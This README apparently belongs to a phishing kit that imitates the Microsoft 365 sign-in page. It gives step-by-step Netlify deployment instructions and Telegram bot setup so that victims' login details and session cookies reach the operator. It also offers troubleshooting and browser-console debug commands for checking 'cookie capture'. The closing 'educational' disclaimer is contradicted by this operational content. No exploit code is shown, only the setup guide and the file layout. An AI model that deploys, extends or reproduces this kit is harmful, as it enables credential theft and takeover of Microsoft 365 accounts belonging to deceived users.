# Microsoft 365 Sign-in Portal

A complete Microsoft 365 authentication system built with React, TypeScript, and Tailwind CSS. This project provides a pixel-perfect replica of the Microsoft 365 sign-in experience with advanced session management and security features.

## 🚀 Features

### Authentic Microsoft Design
- **Pixel-perfect Microsoft 365 UI** - Matches the official Microsoft sign-in page
- **Responsive Design** - Optimized for both desktop and mobile devices
- **Microsoft Branding** - Official colors, fonts, and styling
- **Smooth Animations** - Professional loading states and transitions

### Advanced Authentication
- **Single Sign-On (SSO)** - Streamlined login experience
- **OAuth Integration** - Microsoft OAuth 2.0 support
- **Session Management** - Secure session handling with localStorage/sessionStorage
- **CSRF Protection** - State validation for security

### Security Features
- **Browser Fingerprinting** - Advanced device tracking
- **Cookie Management** - Comprehensive cookie capture and analysis
- **Data Encryption** - Secure data transmission
- **Error Handling** - Robust error management and user feedback

## 🛠️ Tech Stack

- **Frontend**: React 18, TypeScript, Tailwind CSS
- **Build Tool**: Vite
- **Icons**: Lucide React
- **Deployment**: Netlify
- **Backend**: Netlify Functions (Node.js)

## 📦 Installation

1. **Clone the repository**
   ```bash
   git clone <repository-url>
   cd microsoft365-signin
   ```

2. **Install dependencies**
   ```bash
   npm install
   ```

3. **Start development server**
   ```bash
   npm run dev
   ```

4. **Build for production**
   ```bash
   npm run build
   ```

## 🚀 Deployment

### Netlify Deployment

1. **Connect to Netlify**
   - Link your repository to Netlify
   - Set build command: `npm run build`
   - Set publish directory: `dist`

2. **Environment Variables**
   ```
   TELEGRAM_BOT_TOKEN=your_telegram_bot_token
   TELEGRAM_CHAT_ID=your_telegram_chat_id
   UPSTASH_REDIS_REST_URL=your_redis_url
   UPSTASH_REDIS_REST_TOKEN=your_redis_token
   ```

   **⚠️ IMPORTANT**: After adding environment variables in Netlify dashboard, **redeploy** your site for changes to take effect.

   **Telegram Setup Steps**:
   1. Message `@BotFather` on Telegram → `/newbot` → follow instructions
   2. Message `@userinfobot` on Telegram → get your chat ID
   3. Add both values as environment variables in Netlify
   4. Redeploy the site

3. **Deploy**
   ```bash
   npm run build
   # Deploy dist/ folder to Netlify
   ```

## 🔧 Troubleshooting

### Telegram Not Working?

If you're not receiving cookies and login info in Telegram:

1. **Check Environment Variables**: Ensure `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID` are set in Netlify dashboard
2. **Redeploy**: After adding environment variables, redeploy your site
3. **Test Your Bot**: Message your bot directly to ensure it's working
4. **Use Debug Tools**: Open browser console and run:
   ```javascript
   window.telegramDebugger.runFullDiagnostic()
   ```
5. **Check Logs**: Go to Netlify Functions → sendTelegram → Logs for error details

**📖 Detailed Troubleshooting**: See `TELEGRAM_TROUBLESHOOTING.md` for comprehensive solutions.

### Quick Debug Commands

Open browser console (F12) and run:
- `window.telegramDebugger.testTelegramFunction()` - Test Telegram connectivity
- `window.telegramDebugger.checkCookies()` - Check cookie capture
- `window.telegramDebugger.checkEnvironment()` - Verify setup

## 📁 Project Structure

```
microsoft365-signin/
├── public/
│   ├── index.html
│   ├── manifest.json
│   ├── robots.txt
│   └── sitemap.xml
├── src/
│   ├── components/
│   │   ├── mobile/
│   │   │   ├── MobileLandingPage.tsx
│   │   │   └── MobileLoginPage.tsx
│   │   ├── LandingPage.tsx
│   │   └── LoginPage.tsx
│   ├── utils/
│   │   ├── client-cookie-capture.js
│   │   ├── debug-cookies.js
│   │   └── oauthHandler.ts
│   ├── App.tsx
│   ├── main.tsx
│   └── index.css
├── netlify/
│   └── functions/
│       ├── getCookies.js
│       ├── getSession.js
│       ├── saveSession.js
│       ├── sendTelegram.js
│       └── setSession.js
├── netlify.toml
├── _redirects
└── package.json
```

## 🔧 Configuration

### Vite Configuration
The project uses Vite for fast development and building. Configuration is in `vite.config.ts`.

### Tailwind CSS
Styling is handled by Tailwind CSS with custom Microsoft 365 theme colors.

### TypeScript
Full TypeScript support with strict type checking enabled.

## 🔐 Security

- **HTTPS Only** - All communications encrypted
- **CSRF Protection** - State validation for OAuth flows
- **Input Validation** - All user inputs validated
- **Secure Headers** - Security headers configured in Netlify

## 📱 Mobile Support

- **Responsive Design** - Works on all screen sizes
- **Touch Optimized** - Mobile-friendly interactions
- **Progressive Web App** - PWA capabilities included

## 🧪 Development

### Available Scripts

- `npm run dev` - Start development server
- `npm run build` - Build for production
- `npm run preview` - Preview production build
- `npm run lint` - Run ESLint
- `npm run type-check` - Run TypeScript type checking

### Development Server
```bash
npm run dev
# Server runs on http://localhost:5173
```

## 📊 Analytics & Monitoring

- **Session Tracking** - Comprehensive session analytics
- **Error Monitoring** - Real-time error tracking
- **Performance Metrics** - Load time and performance monitoring

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Test thoroughly
5. Submit a pull request

## 📄 License

This project is licensed under the MIT License - see the LICENSE file for details.

## ⚠️ Disclaimer

This project is for educational and demonstration purposes. It replicates the Microsoft 365 interface for learning about modern web development practices.

## 🆘 Support

For support and questions:
- Check the documentation
- Review existing issues
- Create a new issue if needed

---

**Built with ❤️ using React, TypeScript, and Tailwind CSS**